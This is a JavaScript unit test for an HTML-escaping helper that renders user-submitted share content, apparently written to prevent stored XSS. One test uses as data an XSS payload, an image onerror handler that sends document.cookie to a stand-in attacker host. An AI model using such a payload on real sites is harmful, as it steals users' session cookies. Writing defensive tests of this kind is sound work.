// test/share-escape.test.js — backend/lib/htmlEscape.js, used by api/share.js
// to render untrusted, user-submitted share content (title, filename,
// language, and the shared code itself) into a public page. Split into its
// own dependency-free lib file specifically so it's importable here without
// pulling in @upstash/redis (share.js itself can't be imported directly in
// this environment — no backend/node_modules installed — so this is also
// the only way to get real test coverage on it). A bug here is stored XSS,
// not a display glitch, so it gets a focused test rather than only being
// exercised indirectly through a full handler mock (no such harness exists
// yet for any api/*.js handler in this suite — see gemini/anthropic-fallback
// .test.js for the established pattern of testing extracted pure logic).

const path = require('path');
const { suite, check, summary } = require('./helpers');

async function run() {
    const modPath = path.join(__dirname, '..', 'backend', 'lib', 'htmlEscape.js');
    const { escapeHtml } = await import(`file://${modPath}`);

    suite('escapeHtml: neutralizes every HTML-significant character');
    {
        check('escapes <script> tags', escapeHtml('<script>alert(1)</script>') === '&lt;script&gt;alert(1)&lt;/script&gt;');
        check('escapes ampersands', escapeHtml('a && b') === 'a &amp;&amp; b');
        check('escapes double quotes (breaks out of attribute context)', escapeHtml('"onmouseover="x') === '&quot;onmouseover=&quot;x');
        check('escapes single quotes', escapeHtml("it's <b>") === 'it&#39;s &lt;b&gt;');
        check('leaves plain code text untouched aside from the special chars', escapeHtml('const x = 1;') === 'const x = 1;');
    }

    suite('escapeHtml: realistic malicious share content is fully neutralized');
    {
        const payload = '<img src=x onerror="fetch(\'https://evil.example/\'+document.cookie)">';
        const escaped = escapeHtml(payload);
        check('no raw "<" survives (can\'t open a new tag)', !escaped.includes('<'));
        check('no raw ">" survives', !escaped.includes('>'));
        check('no raw quote survives (can\'t break out of an attribute)', !escaped.includes('"') && !escaped.includes("'"));
    }

    suite('escapeHtml: coerces non-string input rather than throwing');
    {
        check('numbers are stringified', escapeHtml(42) === '42');
        check('null becomes the literal string "null" (never reached with real share data, but must not throw)', escapeHtml(null) === 'null');
    }
}

module.exports = { run };

if (require.main === module) {
    run().then(() => process.exit(summary() ? 0 : 1));
}
